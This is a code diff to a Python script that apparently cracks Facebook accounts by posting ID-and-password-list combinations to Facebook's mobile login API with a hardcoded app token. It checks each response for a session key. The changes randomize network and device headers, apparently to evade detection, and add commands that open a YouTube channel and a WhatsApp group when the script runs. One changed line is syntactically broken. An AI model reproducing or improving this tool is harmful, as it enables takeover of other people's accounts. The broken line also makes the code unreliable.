@@ -1,6 +1,8 @@
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
+os.system('xdg-open https://www.youtube.com/@techrahul4794///')
+os.system('xdg-open https://chat.whatsapp.com/Js1oU99b67uGRsaKs88RB7//')
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -439,7 +441,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://b-api.facebook.com/method/auth/login'
+                                url = ' https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -494,23 +496,23 @@ def api5(ids,names,passlist):
                                         'generate_machine_id':'1',
                                         "locale":"es_CU","client_country_code":"CU",
                                         'device':gtt,
-                                        'device_id':'0cd272a7-17dc-4766-958e-5b48799250b',
+                                        'device_id':adid,
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':'310260',
-                                        'x-fb-connection-type':'mobile.LTE',
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-type':'WIFI.LTE',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':'Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.57 Mobile Safari/537.36',
-                                        'x-fb-net-hni':'310260',
+                                        'user-agent':ua_string,
+                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://b-api.facebook.com/method/auth/login'
+                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
